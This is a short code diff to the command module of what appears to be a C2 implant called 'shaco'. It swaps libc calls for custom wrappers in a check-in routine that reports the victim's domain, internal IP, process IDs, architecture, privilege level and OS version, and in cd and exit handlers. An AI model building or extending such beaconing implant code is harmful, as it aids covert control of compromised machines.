@@ -1,4 +1,6 @@
 #include "Commands.h"
+#include "Core.h"
+
 #include "../Common/shaco_stdlib.h"
 #include "../Common/Network.h"
 #include "../Config/Settings.h"
@@ -136,7 +138,7 @@ bool checkin(){
     packer_add_string(packer, os_config->domain);
     packer_add_string(packer, os_config->internal_ip);
     packer_add_int32(packer, os_config->pid);
-    packer_add_int32(packer, getppid());
+    packer_add_int32(packer, s_getppid());
     packer_add_string(packer, os_config->arch);
     packer_add_int32(packer, os_config->elevated);
     packer_add_string(packer, os_config->version);
@@ -235,7 +237,7 @@ PPACKER cd_command(uint8_t *args){
     
     MSG("moving to path: %s:%zu", path, StringLength(path));
 
-    if(chdir(path) != 0){ MSG("can't change directory: ");}
+    if(s_chdir(path) != 0){ MSG("can't change directory: ");}
     return NULL;
 }
 
@@ -247,10 +249,8 @@ PPACKER pwd_command(uint8_t *args){
     return pack;
 }
 
-
-
 PPACKER exit_command(uint8_t *args){
-    _exit(0); //TODO: change to shaco_exit
+    shaco_exit(); 
     return NULL;
 }
 
